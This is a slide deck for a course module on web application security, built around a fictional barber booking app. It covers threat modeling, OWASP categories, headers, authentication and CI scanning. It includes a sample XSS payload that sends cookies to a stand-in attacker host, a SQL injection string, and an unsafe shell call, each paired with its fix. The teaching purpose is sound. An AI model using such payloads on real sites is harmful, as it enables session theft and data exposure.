---
marp: true
theme: default
paginate: true
size: 16:9
---

<!-- Slide 1 -->
# Module 10
## Security: Before the App Goes Public
### Looking at "Slot" through an attacker's eyes

*Modern Application Architecture: From Idea to a Live Product*

---

<!-- Slide 2 -->
## Session plan

- Why it matters right now
- Threat modeling
- The OWASP Top 10 with "Slot" examples
- Access control, injection, XSS, CSRF and CORS
- Authentication and sessions
- Configuration and security headers
- Business-logic abuse
- Supply chain and personal data
- Logs, errors, security in CI
- Lab

---

<!-- Slide 3 -->
## Learning objectives

- Build a **threat model**: what's valuable, where the entry points are, who attacks
- Recognize and fix the most common vulnerabilities (OWASP Top 10)
- Configure authentication, sessions, headers and secrets safely
- Build security checks into CI

---

<!-- Slide 4 -->
## Why right now

- Bots start scanning a new server **within minutes** of it appearing on the internet
- They don't attack you personally, they attack **everyone**: an open DB port, `/.env`, `/admin`, an old WordPress
- "Slot" has something to steal: **client phone numbers** (personal data), the barber's account, the ability to wreck the schedule
- A leak means fines, lost trust and hours of investigation

> Security isn't a feature added at the end, it's a process: threat model → defenses → checks → monitoring.

---

<!-- Slide 5 -->
## Threat modeling

Three questions: **what do we protect**, **where is the way in**, **who attacks**.

| "Slot" asset | Entry point | Attacker |
|---|---|---|
| Client phones and names | Booking API, admin panel | Database harvester, a curious client |
| The barber's account | Login form, password reset | Password guessing, phishing |
| Schedule and bookings | Booking API | A competitor, a bot, a prankster |
| Server and DB | SSH, ports, dependencies | Automated scanners |

**STRIDE** as a checklist: spoofing, tampering, repudiation, information disclosure, denial of service, elevation of privilege.

---

<!-- Slide 6 -->
## The OWASP Top 10 (2025 edition) with "Slot" examples

| # | Category | Example in "Slot" |
|---|---|---|
| A01 | Broken Access Control | `GET /api/bookings/1017` returns someone else's booking |
| A02 | Security Misconfiguration | `DEBUG=True` in production, an open PostgreSQL port |
| A03 | Software Supply Chain Failures | A vulnerable or malicious dependency |
| A04 | Cryptographic Failures | Passwords in plain text or MD5 |
| A05 | Injection | SQL injection in search, XSS in a review |
| A06 | Insecure Design | No limit on bookings — a bot takes every slot |
| A07 | Authentication Failures | Password guessing, no MFA for the admin |
| A08 | Software or Data Integrity Failures | Unsigned webhooks, unverified artifacts in CI |
| A09 | Logging & Alerting Failures | Nobody noticed the attack |
| A10 | Mishandling of Exceptional Conditions | A stack trace in the response, "on error — skip the check" |

---

<!-- Slide 7 -->
## A01: access control and IDOR

```python
# Bad: any logged-in user sees any booking by iterating ids
@app.get("/api/bookings/{booking_id}")
async def get_booking(booking_id: int):
    return await repo.get_booking(booking_id)

# Good: check that the booking belongs to the user
@app.get("/api/bookings/{booking_id}")
async def get_booking(booking_id: int, user: User = Depends(current_user)):
    booking = await repo.get_booking(booking_id)
    if booking is None or not user.can_view(booking):
        raise HTTPException(404)    # not 403: don't confirm the booking exists
    return booking
```

The most common vulnerability: "logged in" ≠ "allowed to see this object". The check goes on **every** endpoint, on the server.

---

<!-- Slide 8 -->
## A05: SQL injection

```python
# Bad: user input becomes part of the SQL
await db.fetch(f"SELECT * FROM bookings WHERE client_phone = '{phone}'")
# phone = "' OR '1'='1"  →  every booking of every client

# Good: a parameterized query — the input travels separately from the SQL
await db.fetch("SELECT * FROM bookings WHERE client_phone = $1", phone)
```

- ORMs and query builders parameterize for you — the danger is raw strings and `f"..."` in SQL
- The same goes for the shell: never `os.system(f"convert {filename}")` with user input

---

<!-- Slide 9 -->
## A05: XSS — someone else's script on your page

A client leaves a review: `<img src=x onerror="fetch('https://evil.example/?c='+document.cookie)">`

- React and Vue **escape** output by default — the danger is `dangerouslySetInnerHTML`, `v-html` and rendering Markdown to HTML without sanitizing
- LLM output (Module 7) is untrusted input too
- HTML sanitizing — DOMPurify; on the server — validate and restrict the format
- **Content Security Policy** is the second line: the browser won't run a script from a foreign domain

---

<!-- Slide 10 -->
## CSRF, cookies and CORS

- **CSRF:** another site sends a request to your API, and the browser attaches the user's cookie
- Defense: cookies with `SameSite=Lax` or `Strict` + a CSRF token for forms; changes only via `POST`/`PATCH`/`DELETE`, never `GET`
- The session cookie: `HttpOnly` (invisible to JavaScript), `Secure` (HTTPS only)
- **CORS** lets the browser read your API's responses from other domains. Allow only your own domains; `*` together with cookies is a misconfiguration
- CORS **doesn't protect the server**: `curl` ignores it. The API still checks permissions

---

<!-- Slide 11 -->
## A07: authentication

| What | Done right |
|---|---|
| Storing passwords | **argon2id** (or bcrypt), never MD5/SHA without salt |
| Guessing | Attempt limits per account and IP, growing delays |
| Admins | **MFA** is mandatory |
| Sessions and tokens | Short lifetime; logout invalidates the session |
| Password reset | A single-use token for 15–30 minutes; don't reveal whether the email exists |
| You may not need passwords at all | Sign in with Telegram, Yandex ID, Google (OAuth/OIDC) or an SMS code |

---

<!-- Slide 12 -->
## A02: security misconfiguration

- `DEBUG=True` in production → stack traces and settings visible to everyone
- Default passwords: `postgres/postgres`, `admin/admin`
- PostgreSQL, Redis, a Docker dashboard open to the internet — private network only (Module 11)
- An exposed `/.env` or `/.git` at the site root
- Detailed errors: "user not found" vs "wrong password" — a hint for guessing
- Extra services and ports — every open port is an entry point

Check: `nmap` your server from outside — only 22, 80, 443 should be open.

---

<!-- Slide 13 -->
## Security headers

```
slot.example {
    header {
        Strict-Transport-Security "max-age=31536000; includeSubDomains"
        Content-Security-Policy "default-src 'self'; img-src 'self' data:; frame-ancestors 'none'"
        X-Content-Type-Options "nosniff"
        Referrer-Policy "strict-origin-when-cross-origin"
        -Server
    }
    reverse_proxy web:3000
}
```

| Header | Protects against |
|---|---|
| HSTS | Downgrading HTTPS to HTTP |
| CSP | XSS, loading foreign scripts; `frame-ancestors` — framing (clickjacking) |
| `nosniff` | Executing a file of the wrong type |
| `Referrer-Policy` | Leaking page addresses to other sites |

---

<!-- Slide 14 -->
## A06: business-logic abuse

In a minute, a bot books **every** Friday slot with made-up numbers. Not a single "vulnerability" — it's all via the API.

- A limit on **active bookings per phone** (e.g. 2)
- Booking confirmation by a code in Telegram or SMS
- Limits per IP and device; captcha only on anomalies
- Auto-cancel unconfirmed bookings after 15 minutes
- An alert to the barber on a spike in bookings

Threat modeling finds threats like these, scanners don't.

---

<!-- Slide 15 -->
## A03: the supply chain

- 90% of your app's code is **other people's packages**
- **Lockfiles** and pinned versions; package hashes (`uv lock`, `pip --require-hashes`, `package-lock.json`)
- **pip-audit**, **npm audit**, Dependabot or Renovate — known vulnerabilities and automatic update PRs
- **Trivy** — vulnerabilities in images; an **SBOM** (Syft) — a list of everything inside
- **Slopsquatting:** an AI agent suggests a package that doesn't exist — an attacker registers that name. Before installing, check the package is real and popular

---

<!-- Slide 16 -->
## Personal data

- **Minimization:** don't collect what you don't need; a name and a phone are enough to book
- **Encryption:** in transit — TLS; at rest — disk or DB encryption; backups too
- **Masking in logs:** `+7******4567`, no tokens and no passwords
- **Retention:** delete or anonymize old bookings
- **Access:** which staff see the data — and a log of that access
- Legal requirements (152-FZ, GDPR) — Module 12

---

<!-- Slide 17 -->
## Logs, alerts and errors

- Log security events: logins and failures, access denials, admin actions, settings changes
- Alerts: a spike in `401`/`403`, many failed logins, a sudden rise in bookings
- The client gets a **generic message** and a `request_id`; details go only to the logs
- **Fail closed:** if the permission check crashes, access is denied, not granted

```json
{"type": "https://slot.example/errors/internal", "title": "Something went wrong",
 "status": 500, "request_id": "7f3a9c"}
```

---

<!-- Slide 18 -->
## Security in CI

| Check | Tool | What it finds |
|---|---|---|
| Secrets in code | **gitleaks** | Keys and passwords in commits |
| SAST | **Semgrep**, Bandit | Dangerous code patterns: SQL from strings, `eval` |
| Dependencies | **pip-audit**, npm audit | Known vulnerabilities in packages |
| Images | **Trivy** | Vulnerabilities in the base image and OS packages |
| DAST | **OWASP ZAP** baseline | Problems in the running app on staging |

A check fails → the PR doesn't merge. False positives get triaged and marked, not the whole check disabled.

---

<!-- Slide 19 -->
## Security and AI agents

- An agent's code gets **the same review** as an intern's — if not stricter
- Agents tend to "fix" a failing check by **disabling** it or loosening the rule
- An agent may write a secret into a log, a test or a commit — gitleaks catches it in CI
- Instructions in an issue, a README or a dependency are **data**, not commands for the agent
- Agents are **good at finding** vulnerabilities from a checklist, but report false positives — verify every finding

---

<!-- Slide 20 -->
## Lab

1. A one-page threat model for "Slot"
2. **On your own staging only**, in pairs: IDOR between two test users, SQL injection, XSS through a review, password guessing, mass booking by a script
3. An **OWASP ZAP** baseline scan
4. Fix the findings; add security headers and limits
5. In CI: gitleaks, Semgrep, pip-audit/npm audit, Trivy
6. **With an agent:** an OWASP checklist code review and tests that reproduce each vulnerability before the fix; verify every finding yourself

---

<!-- Slide 21 -->
## Deliverable

- The threat model
- An attack log: what you tried, what got through, how you fixed it
- ZAP reports before and after
- A CI pipeline with security checks

---

<!-- Slide 22 -->
## Recap and next module

- Threat model first: what we protect, where the way in is, who attacks
- Permissions on every request; input parameterized and escaped
- Passwords — argon2id, admins — MFA, cookies — `HttpOnly`, `Secure`, `SameSite`
- Business-logic abuse is found by threat modeling, not by a scanner
- Security checks live in CI, not "someday"
- Next: **Module 11 — Infrastructure**: putting "Slot" on the internet on your own domain
